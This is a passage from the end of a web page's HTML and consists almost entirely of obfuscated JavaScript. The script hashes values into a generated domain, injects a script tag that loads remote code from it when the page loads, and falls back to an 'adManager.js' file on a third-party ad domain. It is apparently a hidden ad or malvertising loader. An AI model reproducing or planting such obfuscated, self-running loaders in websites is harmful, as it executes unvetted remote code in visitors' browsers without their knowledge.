2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>